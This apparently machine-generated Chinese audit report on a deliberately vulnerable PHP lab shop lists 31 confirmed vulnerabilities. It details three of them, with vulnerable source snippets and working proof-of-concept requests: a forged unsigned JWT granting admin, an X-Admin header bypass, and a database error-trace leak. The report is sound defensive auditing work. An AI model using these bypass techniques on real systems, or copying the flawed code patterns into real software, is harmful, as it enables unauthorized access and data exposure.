# 源码审计完整终审报告（3b50dbaf）

> 报告类型：完整终审报告；发布状态：可发布（完整终审）
> 事实包 final-review/v2 · 渲染器 final-report/v3 · 策略 audit-runtime-3
> 运行 `3b50dbaf45955d989aacf47162e47967` · 快照 `586b79b41f8e4f59be80f2a9b548902b` · 源码哈希 `67fd87e9ae771d10…` · 输入哈希 `c23b6cfc1a968df64a06c66ef539d1ebc3ed2778185a0307e18282ff0be1dbcd`
> 本报告由宿主从冻结事实包确定性生成；数量、位置、验证状态与评分均不由模型填写。

## 1. 执行与终审摘要

- 运行：`3b50dbaf45955d989aacf47162e47967`；状态：completed；停止原因：goal_met；现有源码任务和覆盖已结算，进入统一证据终审。
- 审计完整性：完成（状态、覆盖与验证均闭环）
- 报告类型：final；发布状态：可发布（完整终审）

- 原始记录：34
- 有效记录：31
- 规范结论：31
- 已接受漏洞：31
- 待终审：0
- 存疑或排除：0

“已接受漏洞”以当前版本的正式终审处置为准：静态证据充分可接受；动态已验证结论还须完成同版本观测复核。其余结论逐条保留，不会因为缺少终审额度而从报告中消失。

| 完成维度 | 已完成 | 分母 | 说明 |
|---|---:|---:|---|
| 源码覆盖（读取） | 61 | 61 | 已读只表示宿主记录过读取 |
| 源码覆盖（读取+带理由跳过） | 61 | 61 | 跳过不是安全结论 |
| 必做方向结算 | 78 | 78 | 未决 0 个 |
| 动态验证完成 | 31 | 31 | 待验证 0 条 |
| 正式复核 | 31 | 31 | 复核存疑或未复核不计入已接受 |
| 源码覆盖（仍待复核） | 0 | 61 | 未读且未跳过 0 个 |

**已接受漏洞**

- C-01 合作方结算门户仅解码 JWT 载荷不验签，任意用户伪造 role=admin 即可越权读取全部订单结算数据（lab30-shop/app/public/partner/portal.php:3）
- C-02 ops/maintenance.php 仅凭客户端 X-Admin 请求头判定服务身份，未登录即可触发维护写操作（lab30-shop/app/public/ops/maintenance.php:3）
- C-03 ops/database.php 归档数据源探测将 PDO 异常堆栈原样回显给运营用户，泄露数据库凭据与服务器路径信息（lab30-shop/app/public/ops/database.php:3）
- C-04 support/download.php file 参数未规范化导致路径穿越任意文件读取（lab30-shop/app/public/support/download.php:3）
- C-05 support/messages.php 留言正文未经 h() 输出导致存储型 XSS（lab30-shop/app/public/support/messages.php:5）
- C-06 商品欢迎页 name 参数未编码输出导致反射型 XSS（lab30-shop/app/public/catalog/greeting.php:3）
- C-07 ops/report.php 将用户可控 nickname 直接拼入 SQL 导致二次注入（lab30-shop/app/public/ops/report.php:3）
- C-08 钱包提现余额检查与扣减非原子，存在并发竞态透支（lab30-shop/app/public/wallet/withdraw.php:7）
- C-09 ops/batch-check.php 将 GET 参数 host 未转义拼入 shell_exec，operator 账号可执行任意系统命令（lab30-shop/app/src/host_check.php:2）
- C-10 订单详情仅按请求 id 查询，任意登录用户可读取他人订单（lab30-shop/app/public/orders/detail.php:2）
- C-11 注册与登录链路口令使用无盐 MD5 弱哈希（lab30-shop/app/public/auth/register.php:8）
- C-12 continue.php 的 next 参数写入 Location 头导致开放重定向（lab30-shop/app/public/auth/continue.php:3）
- C-13 订单创建价格取自客户端 POST，未按服务端商品价格重算导致价格篡改（lab30-shop/app/public/orders/create.php:5）
- C-14 内容中心 page 参数直接拼接进 include 导致本地文件包含（lab30-shop/app/public/content/page.php:3）
- C-15 运营网络诊断将 host 参数拼入 shell_exec 造成系统命令注入（lab30-shop/app/public/ops/ping.php:2）
- C-16 商品目录搜索参数 q 拼接进 LIKE 查询导致 SQL 注入（lab30-shop/app/public/catalog/index.php:4）
- C-17 ops/jobs.php 对 base64 提交数据 unserialize 触发 DispatchJob::__wakeup 内 shell_exec 造成命令执行（lab30-shop/app/public/ops/jobs.php:3）
- C-18 登录入口接受外部 SID 且认证成功后不换发会话，导致会话固定（lab30-shop/app/public/auth/login.php:3）
- C-19 ops/members.php 会员查询参数 q 经 member_lookup 拼接进 SQL 造成注入（lab30-shop/app/src/member_lookup.php:3）
- C-20 运营 XML 导入以 LIBXML_NOENT|LIBXML_DTDLOAD 解析用户 XML 导致 XXE（lab30-shop/app/public/ops/xml-import.php:3）
- C-21 邮箱设置接口缺失 CSRF 校验，可被跨站请求伪造修改受害者邮箱（lab30-shop/app/public/account/settings.php:5）
- C-22 运营模板预览页面将 $_GET['template'] 裸变量传入 include 导致任意本地文件包含（可延伸 RFI）（lab30-shop/app/public/ops/template-preview.php:3）
- C-23 个人主页预览将 url 参数未编码写入 href 属性，构成反射型 XSS（lab30-shop/app/public/account/profile.php:3）
- C-24 会员备份恢复接口对用户输入执行 unserialize 并信任对象字段写入（lab30-shop/app/public/account/backup.php:5）
- C-25 ops/users.php 用客户端 Cookie role 判定管理员，登录用户可伪造越权读取全部用户（lab30-shop/app/public/ops/users.php:2）
- C-26 营销模板渲染将双花括号内容传入 eval 造成代码执行（lab30-shop/app/public/ops/template-render.php:3）
- C-27 运营链接预览 file_get_contents 无协议/主机白名单导致 SSRF（lab30-shop/app/public/ops/url-preview.php:3）
- C-28 账户资料更新接口允许普通用户批量赋值修改 role/balance/tier 实现提权（lab30-shop/app/public/account/update.php:5）
- C-29 注册入口 POST 状态变更未受 check_csrf 保护，可被跨站强制注册（lab30-shop/app/public/auth/register.php:7）
- C-30 兑换码弱类型比较可用魔术哈希绕过并免费升级金卡会员（lab30-shop/app/public/account/redeem.php:5）
- C-31 ops/formula.php 将 $_GET['func'] 直接作为函数名动态调用，可调用 system 等实现任意代码/命令执行（lab30-shop/app/public/ops/formula.php:3）

## 2. 范围和方法

- 项目：39211162aa984b25b60228c194b531ae；快照：`586b79b41f8e4f59be80f2a9b548902b`
- 源码包哈希（archive sha256）：`67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c`
- 事实包：final-review/v2；渲染器：final-report/v3；模板哈希：`47cdea74fc5ab37e`
- 输入哈希：`c23b6cfc1a968df64a06c66ef539d1ebc3ed2778185a0307e18282ff0be1dbcd`；冻结时间：2026-11-11T03:01:58.133285+00:00；生成时间：2026-11-11T03:01:58.133285+00:00
- 模型配置：deepseek-flash；策略版本：audit-runtime-3

本次报告只使用宿主记录的冻结事实：源码引用由服务器从快照读取并核对哈希，动态验证取自隔离 runner 的作业记录，正式复核按 finding revision 与 verification id 精确引用。模型的结论陈述与修复建议以“结论陈述”标注，不作为证据；未执行、环境失败与验证不确定都不解释为误报。

| 预算 | 上限 | 实际使用 | 剩余 |
|---|---:|---:|---:|
| 模型响应 | 284 | 276 | 8 |
| 工具调用 | 5075 | 234 | 4841 |
| 秒 | 10110 | 6497.901 | 3612.099 |

- 继续来源：运行 `566a1c802c1e5ef19b153cb5529b1446`；范围 audit。本报告预算与用量仅属于本次继续任务，原运行和报告保持不变。
- 原运行用量（独立记录，不重复计入本次）：{"responses":200,"seconds":4389.215,"tools":145}

- 上下文：峰值请求 227070 字节 / 上限 393216 字节；摘要请求 0 次；硬上限命中 0 次。

| 阶段 | 请求配额 | 已用 |
|---|---:|---:|
| 源码挖掘 | 174 | 174 |
| POC 验证 | 80 | 80 |
| 统一终审 | 30 | 22 |
- 调度政策：host-queue-v1；配额：固定分配。
- 待终审 0 项，预计 0 批；当前预留 0 次请求、30 秒；按实际批次容量与 Worker 调整，不增加整次额度。
- POC 执行：。

## 3. 规范漏洞清单

| 编号 | 标题 | 类型 | 评分 | 位置 | 静态判读 | 动态验证 | 正式终审 | 处置 |
|---|---|---|---|---|---|---|---|---|
| C-01 | 合作方结算门户仅解码 JWT 载荷不验签，任意用户伪造 role=admin 即可越权读取全部订单结算数据 | auth_bypass | CVSS 3.1 Base 7.5 (high) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:… | lab30-shop/app/public/partner/portal.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-02 | ops/maintenance.php 仅凭客户端 X-Admin 请求头判定服务身份，未登录即可触发维护写操作 | auth_bypass | CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/… | lab30-shop/app/public/ops/maintenance.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-03 | ops/database.php 归档数据源探测将 PDO 异常堆栈原样回显给运营用户，泄露数据库凭据与服务器路径信息 | info_disclosure | CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/… | lab30-shop/app/public/ops/database.php:3 | 缺上下文（1 项） | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-04 | support/download.php file 参数未规范化导致路径穿越任意文件读取 | path_traversal | CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/… | lab30-shop/app/public/support/download.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-05 | support/messages.php 留言正文未经 h() 输出导致存储型 XSS | xss_s | CVSS 3.1 Base 5.4 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/… | lab30-shop/app/public/support/messages.php:5 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-06 | 商品欢迎页 name 参数未编码输出导致反射型 XSS | xss_r | CVSS 3.1 Base 5.4 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/… | lab30-shop/app/public/catalog/greeting.php:3 | 缺上下文（1 项） | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-07 | ops/report.php 将用户可控 nickname 直接拼入 SQL 导致二次注入 | sqli | CVSS 3.1 Base 5.4 (medium) · CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:L/… | lab30-shop/app/public/ops/report.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-08 | 钱包提现余额检查与扣减非原子，存在并发竞态透支 | race_condition | CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/… | lab30-shop/app/public/wallet/withdraw.php:7 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-09 | ops/batch-check.php 将 GET 参数 host 未转义拼入 shell_exec，operator … | command_injection | CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:… | lab30-shop/app/src/host_check.php:2 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-10 | 订单详情仅按请求 id 查询，任意登录用户可读取他人订单 | idor | CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/… | lab30-shop/app/public/orders/detail.php:2 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-11 | 注册与登录链路口令使用无盐 MD5 弱哈希 | weak_crypto | CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/… | lab30-shop/app/public/auth/register.php:8 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-12 | continue.php 的 next 参数写入 Location 头导致开放重定向 | open_redirect | CVSS 3.1 Base 3.5 (low) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N | lab30-shop/app/public/auth/continue.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-13 | 订单创建价格取自客户端 POST，未按服务端商品价格重算导致价格篡改 | price_manipulation | CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/… | lab30-shop/app/public/orders/create.php:5 | 缺上下文（1 项） | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-14 | 内容中心 page 参数直接拼接进 include 导致本地文件包含 | lfi | CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/… | lab30-shop/app/public/content/page.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-15 | 运营网络诊断将 host 参数拼入 shell_exec 造成系统命令注入 | command_injection | CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:… | lab30-shop/app/public/ops/ping.php:2 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-16 | 商品目录搜索参数 q 拼接进 LIKE 查询导致 SQL 注入 | sqli | CVSS 3.1 Base 9.4 (critical) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:… | lab30-shop/app/public/catalog/index.php:4 | 缺上下文（1 项） | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-17 | ops/jobs.php 对 base64 提交数据 unserialize 触发 DispatchJob::__wak… | insecure_deserialization | CVSS 3.1 Base 9.9 (critical) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:… | lab30-shop/app/public/ops/jobs.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-18 | 登录入口接受外部 SID 且认证成功后不换发会话，导致会话固定 | session_fixation | CVSS 3.1 Base 6.8 (medium) · CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/… | lab30-shop/app/public/auth/login.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-19 | ops/members.php 会员查询参数 q 经 member_lookup 拼接进 SQL 造成注入 | sqli | CVSS 3.1 Base 7.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:… | lab30-shop/app/src/member_lookup.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-20 | 运营 XML 导入以 LIBXML_NOENT&#124;LIBXML_DTDLOAD 解析用户 XML 导致 XXE | xxe | CVSS 3.1 待评分 | lab30-shop/app/public/ops/xml-import.php:3 | 缺上下文（2 项） | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-21 | 邮箱设置接口缺失 CSRF 校验，可被跨站请求伪造修改受害者邮箱 | csrf | CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/… | lab30-shop/app/public/account/settings.php:5 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-22 | 运营模板预览页面将 $_GET['template'] 裸变量传入 include 导致任意本地文件包含（可延伸 RFI… | lfi | CVSS 3.1 Base 8.3 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:… | lab30-shop/app/public/ops/template-preview.php:3 | 缺上下文（1 项） | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-23 | 个人主页预览将 url 参数未编码写入 href 属性，构成反射型 XSS | xss_r | CVSS 3.1 Base 5.4 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/… | lab30-shop/app/public/account/profile.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-24 | 会员备份恢复接口对用户输入执行 unserialize 并信任对象字段写入 | insecure_deserialization | CVSS 3.1 Base 7.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:… | lab30-shop/app/public/account/backup.php:5 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-25 | ops/users.php 用客户端 Cookie role 判定管理员，登录用户可伪造越权读取全部用户 | auth_bypass | CVSS 3.1 待评分 | lab30-shop/app/public/ops/users.php:2 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-26 | 营销模板渲染将双花括号内容传入 eval 造成代码执行 | code_execution | CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:… | lab30-shop/app/public/ops/template-render.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-27 | 运营链接预览 file_get_contents 无协议/主机白名单导致 SSRF | ssrf | CVSS 3.1 待评分 | lab30-shop/app/public/ops/url-preview.php:3 | 缺上下文（2 项） | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-28 | 账户资料更新接口允许普通用户批量赋值修改 role/balance/tier 实现提权 | mass_assignment | CVSS 3.1 Base 9.6 (critical) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:… | lab30-shop/app/public/account/update.php:5 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-29 | 注册入口 POST 状态变更未受 check_csrf 保护，可被跨站强制注册 | csrf | CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/… | lab30-shop/app/public/auth/register.php:7 | 缺上下文（2 项） | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-30 | 兑换码弱类型比较可用魔术哈希绕过并免费升级金卡会员 | weak_type_comparison | CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/… | lab30-shop/app/public/account/redeem.php:5 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-31 | ops/formula.php 将 $_GET['func'] 直接作为函数名动态调用，可调用 system 等实现任意… | code_execution | CVSS 3.1 Base 8.3 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:… | lab30-shop/app/public/ops/formula.php:3 | 缺上下文（1 项） | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |

## 4. 逐条漏洞详单

### C-01 合作方结算门户仅解码 JWT 载荷不验签，任意用户伪造 role=admin 即可越权读取全部订单结算数据

- 当前版本：finding `9f5d703b4b6f446ca5a3f2b7b6e61942` revision 1（项目版本 22）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/partner/portal.php:3`；文件：`lab30-shop/app/public/partner/portal.php`
- 证据引用：`99c262dc45d98b87` lab30-shop/app/public/partner/portal.php:2-2；`a886b187732cd22c` lab30-shop/app/public/partner/portal.php:3-3；`1e27ea27920ba4b2` lab30-shop/app/public/partner/portal.php:4-4；`a38e3c88da1d79cc` lab30-shop/app/public/partner/portal.php:5-5；`ab54a1f06e186428` lab30-shop/app/public/partner/token.php:4-4
- 根因类别：task_goal:v2:7a742f1a6f97fd5458be:1（规范类型 auth_bypass）

**结论陈述（模型产出，不是证据）**

partner/portal.php 从 POST 参数或 Cookie 中取 partner_token，仅用 explode('.') 拆分后 base64 解码第二段作为 payload，完全跳过对 HS256 签名的校验，也不校验 sub 与当前会话用户是否一致。随后仅判断 payload['role']==='admin' 即通过鉴权，并执行 SELECT order_no,total FROM orders 返回全部订单数据。由于签名密钥未参与校验，攻击者只需构造 header.payload.signature 形式（签名可任意）的 JWT，在 payload 中写 role=admin，即可在未登录或普通会员会话下读取全站订单号与金额。token.php 生成的令牌本身绑定 $u['id']，但 portal 端未使用该绑定，也未调用 user()/require_user()，故归属绑定被完全绕过。

- 攻击前身份与适用前提：portal.php 可公开访问；攻击者能发送自定义 POST 或设置 Cookie；无需任何账号。
- 入口 → 传播 → 危险操作/状态变更：HTTP POST 参数 token 或 Cookie partner_token，内容完全由攻击者构造 → portal.php:2 取 token 并拆分为三段，解码第二段为 payload；portal.php:3 直接判断 payload['role']==='admin'；通过后 portal.php:4 查询全表 orders 并在 portal.php:5-6 输出。 → portal.php:4 db()->query('SELECT order_no,total FROM orders ORDER BY id') 无任何用户归属过滤地读取全部订单结算数据
- 防护与边界：token.php:4 虽用 HMAC 生成签名，但 portal.php 从不校验第三段签名，也未比对 sub 与当前会话用户，签名密钥与归属绑定均未被使用。
- 静态判读：证据已记录
- 动态验证：动态确认（verification `f29bc4902fbb4b4c9b565c8cabfaf31f`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

guest 身份向 /partner/portal.php 提交 Accept: application/json 与 token=eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAxLCAicm9sZSI6ICJhZG1pbiIsICJuYW1lIjogIngifQ.forgedsig（载荷 {"sub":1,"role":"admin","name":"x"}，签名为不可验证的 ".forgedsig"）：HTTP 200，响应体 {"role":"admin","settlements":[{"order_no":"SG-1001","total":"129.00"},{"order_no":"SG-1002","total":"158.00"}]}，HAS_SETTLEMENTS True（job 1701fb143b564fa99f0cdbc7ccb91e0d，exit 0）。同一脚本先以 NORMAL_TOKEN_STATUS 403 建立对照，唯一变化仅为 token 载荷与签名。

- 评分依据：CVSS 3.1 Base 7.5 (high) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：portal.php 必须使用服务端密钥对前两段重新计算 HMAC-SHA256 并用 hash_equals 校验签名，拒绝 alg 非 HS256 与缺签名的令牌；同时校验 payload.sub 与当前会话 user()['id'] 一致，并对订单查询按该合作方归属过滤。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/partner/portal.php:2-2`（sha256 `e1267edb0f9df936…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';$token=(string)($_POST['token']??$_COOKIE['partner_token']??'');$parts=explode('.',$token);$payload=count($parts)===3?json_decode((string)base64_decode(strtr($parts[1],'-_','+/')),true):null;
```

`lab30-shop/app/public/partner/portal.php:3-3`（sha256 `e1267edb0f9df936…`）

```php
    3  if(!is_array($payload)||($payload['role']??'')!=='admin')fail_request('此合作方功能仅向管理员开放。',403);
```

`lab30-shop/app/public/partner/portal.php:4-4`（sha256 `e1267edb0f9df936…`）

```php
    4  $rows=db()->query('SELECT order_no,total FROM orders ORDER BY id')->fetchAll();
```

`lab30-shop/app/public/partner/portal.php:5-5`（sha256 `e1267edb0f9df936…`）

```php
    5  if(str_contains($_SERVER['HTTP_ACCEPT']??'','application/json'))json_response(['role'=>'admin','settlements'=>$rows]);
```

`lab30-shop/app/public/partner/token.php:4-4`（sha256 `391948b46efce76c…`）

```php
    4  $header=b64url(json_encode(['alg'=>'HS256','typ'=>'JWT']));$payload=b64url(json_encode(['sub'=>$u['id'],'role'=>$u['role'],'name'=>$u['username']]));$key=db()->query("SELECT value FROM settings WHERE `key`='generation'")->fetchColumn();$token=$header.'.'.$payload.'.'.b64url(hash_hmac('sha256',$header.'.'.$payload,$key,true));
```

### C-02 ops/maintenance.php 仅凭客户端 X-Admin 请求头判定服务身份，未登录即可触发维护写操作

- 当前版本：finding `e2cf827251824b459229883c352560e6` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/maintenance.php:3`；文件：`lab30-shop/app/public/ops/maintenance.php`
- 证据引用：`6c092feeb2c2840e` lab30-shop/app/public/ops/maintenance.php:2-5；`78224482780bf94a` lab30-shop/app/src/bootstrap.php:33-37
- 根因类别：task_goal:v2:65de7ffbfcde45c71f46:1（规范类型 auth_bypass）

**结论陈述（模型产出，不是证据）**

maintenance.php 第3行以 ($_SERVER['HTTP_X_ADMIN']??'')!=='1' 作为唯一身份校验，该请求头完全由客户端控制，攻击者无需任何会话即可通过；第4行随即向 jobs 表插入任务记录。入口未调用 bootstrap.php 中定义于第33-37行的 require_user()，因此绕过登录与角色边界。

- 攻击前身份与适用前提：无需登录；可访问 /ops/maintenance.php；POST 分支需 POST 方法。
- 入口 → 传播 → 危险操作/状态变更：未认证 HTTP 客户端的 X-Admin 请求头 → 请求进入 maintenance.php；第3行读取 HTTP_X_ADMIN 与 '1' 严格比较，无会话/签名；通过后第4行 db()->prepare(...)->execute 写入 jobs 表。 → 以内部服务身份向 jobs 表插入 queued 任务，绕过登录与角色授权。
- 防护与边界：无有效防护：普通请求头可任意伪造，无 HMAC/服务端密钥比对，也没有 require_user() 调用。
- 静态判读：证据已记录
- 动态验证：动态确认（verification `321c1c5ebdfa4b6eb8458025e6c452b4`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

同一无会话 guest 仅添加请求头 X-Admin: 1：GET /ops/maintenance.php → 200 {"service":"settlement-maintenance","authorized":true}；POST → 200 {"accepted":true,"job_id":386}。随后 operator GET /ops/jobs.php（200）读回：386 &#124; 系统对账 &#124; queued &#124; 维护接口发起（385 仍在下方），确认攻击变量造成了新的持久化任务记录。

- 评分依据：CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：移除对 HTTP_X_ADMIN 的信任，改用 require_user(['admin']) 或服务端密钥/HMAC 校验，并记录审计。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/maintenance.php:2-5`（sha256 `b96aecd7df7c5fa4…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';
    3  if(($_SERVER['HTTP_X_ADMIN']??'')!=='1')fail_request('内部维护接口需要有效的服务身份。',403);
    4  if($_SERVER['REQUEST_METHOD']==='POST'){db()->prepare("INSERT INTO jobs(user_id,title,status,details) VALUES(4,?,'queued','维护接口发起')")->execute(['系统对账']);json_response(['accepted'=>true,'job_id'=>(int)db()->lastInsertId()]);}
    5  json_response(['service'=>'settlement-maintenance','authorized'=>true]);
```

`lab30-shop/app/src/bootstrap.php:33-37`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
   37  }
```

### C-03 ops/database.php 归档数据源探测将 PDO 异常堆栈原样回显给运营用户，泄露数据库凭据与服务器路径信息

- 当前版本：finding `0e88b1f8b3d04a0798676aeccba07cf9` revision 1（项目版本 6）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/database.php:3`；文件：`lab30-shop/app/public/ops/database.php`
- 证据引用：`17e5f04f686928da` lab30-shop/app/public/ops/database.php:2-4；`bd2a787730066498` lab30-shop/app/src/bootstrap.php:4-7；`78224482780bf94a` lab30-shop/app/src/bootstrap.php:33-37
- 根因类别：task_goal:v2:9bb0b7febdb60eab8d9f:1（规范类型 info_disclosure）

**结论陈述（模型产出，不是证据）**

第2行仅要求 operator/admin 登录，第3行由 $_GET['probe'] 决定连接 shop_archive_unconfigured（归档）或默认库；连接失败时 catch 把异常类名、PDO 异常 message（含 host、dbname、用户名）以及完整 getTraceAsString() 拼入 $output，第4行在该页 <pre> 中输出（仅 HTML 转义，不做信息过滤）。任何 operator 或普通登录用户越权拿到 operator 会话后，只要请求 ?probe=archive 即可获得归档库环境细节与源码绝对路径，属于有意未脱敏的错误详情泄露；正常分支返回固定文案，攻击分支返回异常详情，差异可观测。

- 攻击前身份与适用前提：需要已登录 operator 或 admin 角色的账号（require_user 校验通过）；数据库归档库未配置或不可达，使 PDO 抛出连接异常；无需 CSRF（GET 请求）。
- 入口 → 传播 → 危险操作/状态变更：未记录 → GET /ops/database.php?probe=archive → 第3行 PDO 构造失败抛 PDOException → catch 拼接类名+message+trace → $output → 第4行 h($output) 回显。 → 未记录
- 防护与边界：仅 require_user(['operator','admin']) 做角色准入；输出处 h() 只防 XSS，不限制异常文本内容；没有统一错误页或 debug=false 处理。
- 静态判读：缺上下文（1 项）；缺失上下文：无法确认生产环境 display_errors/错误展示配置，但应用已显式拼接并回显 trace，故不改变信息泄露结论
- 动态验证：动态确认（verification `e4141fdd0a1f4adf848e84833e1f6a42`）
- 正式终审：独立批次 04d1b79269574856b284cbde71c9678a；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

job 68fcea528fa446d0872a57eb02a0d2e9（operator，GET /ops/database.php?probe=archive，HTTP 200）：<pre>PDOException: SQLSTATE[HY000] [1044] Access denied for user 'shop'@'%' to database 'shop_archive_unconfigured'\n#0 /var/www/shop/public/ops/database.php(3): PDO->__construct('mysql:host=lab3...', 'shop', Object(SensitiveParameterValue))\n#1 {main}</pre>（页面中为 HTML 转义形式）。泄露 DB 用户名 shop、库名、host 前缀与源码绝对路径；密码因 SensitiveParameterValue 未显示。

- 评分依据：CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N；引擎 cvss31-base-1；适用结论版本 1
